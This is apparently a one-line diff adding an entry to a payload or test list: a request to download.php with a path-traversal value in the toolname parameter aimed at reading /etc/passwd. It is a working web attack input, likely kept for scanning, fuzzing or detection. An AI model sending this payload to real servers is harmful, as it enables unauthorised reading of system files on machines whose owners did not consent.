@@ -1,0 +1,1 @@
+/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
